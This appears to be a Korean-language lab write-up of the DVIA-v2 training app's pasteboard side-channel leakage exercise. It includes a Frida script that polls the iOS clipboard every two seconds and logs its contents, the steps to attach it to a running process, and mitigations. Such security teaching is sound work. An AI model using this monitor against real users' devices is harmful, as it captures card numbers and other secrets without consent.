---
layout: post
title: iOS DVIA-v2 | Side Channel Data Leakage (Pasteboard)
subtitle: Shared Clipboard 취약점
categories: iOS
tags: [iOS, Moblie]
---

## 취약점 개요

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/0ee28872-faff-43cf-863e-49e4bc3026ea">
</p>

**부채널 데이터 유출**은 사용되는 어플리케이션의 주 기능이 아닌 타 기능을 통해 데이터가 유출되는 취약점을 말한다. 의도하지 않은 데이터 유출은 개발자가 실수로 모바일 디바이스의 다른 앱이 쉽게 액세스할 수 있는 위치에 민감한 정보나 데이터를 저장할 때 발생한다. 

개발자의 코드가 사용자 또는 백엔드에서 제공한 민감한 정보를 처리할 때 이 과정에서 개발자가 알지 못하는 부작용으로 인해 해당 정보가 모바일 디바이스의 안전하지 않은 위치에 배치되어 디바이스의 다른 앱이 공개적으로 액세스할 수 있게 된다. 일반적으로 이러한 부작용은 기본 모바일 디바이스의 운영 체제(OS)에서 발생하며 공격자는 간단한 코드를 작성하여 민감한 정보가 저장된 위치에 액세스할 수 있다.

## 취약점 실습

* **실습 환경 : iOS 14.6, iPhone 8**

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/210b2789-38c1-43b7-bbd8-6c9fb23d3396">
</p>

* **좌측 상단 메뉴 > Side Channel Data Leakage > Pasteborad**

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/ae3bf156-7c99-4167-b1f7-4aa398bf71da">
</p>

ID, Card Number, CVV에 대한 입력이 있으며 Long Click을 이용하여 클립보드 저장이 가능하다.

### Frida Code

```javascript
function start_pasteboard_monitoring(interval_value)
{
    var pasteboard = (ObjC.classes.UIPasteboard).generalPasteboard();
    var latest_word = "";
    setInterval(function(){
        try
        {
            var on_pasteboard = pasteboard.string().toString()
            if(on_pasteboard != latest_word)
            {
                console.log("[*] Found on pasteboard: "+ on_pasteboard);
                latest_word = on_pasteboard;
            }
        }
        catch(err)
        {
            a = "";
        }
    }, interval_value);

}
//start_pasteboard_monitoring(INTERVAL_VALUE_HERE_MILLISECONDS)
start_pasteboard_monitoring(2000)
```

해당 코드를 실행하기 위해서는 frida 옵션을 `-f {package_name}`이 아닌 실행 중인 프로세스를 확인하여 `-p` 옵션으로 **process id**를 인자로 줘야 앱이 죽지 않고 클립보드 모니터링이 가능하다.

```shell
# frida-ps -Ua

  PID  Name             Identifier
-----  ---------------  --------------------------------------------
14949  App Store        com.apple.AppStore
22414  DVIA-v2          com.highaltitudehacks.DVIAswiftv2.BP466HT2UY
14947  Drive            com.google.Drive
```

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/01af71ca-926f-4fcc-a8d9-2be373cc87c4">
</p>

클립보드에 저장된 내용을 2초마다 출력하여 위 처럼 저장된 클립보드에 내용을 가져오는 것을 알 수 있다.

## 대응 방안

* 클립보드에 존재한 데이터를 제한 시간만 유지하게 하여 일정 시간 지나면 삭제되도록 한다.

* 중요 정보에 대한 내용을 복사할 수 없도록 조치 한다.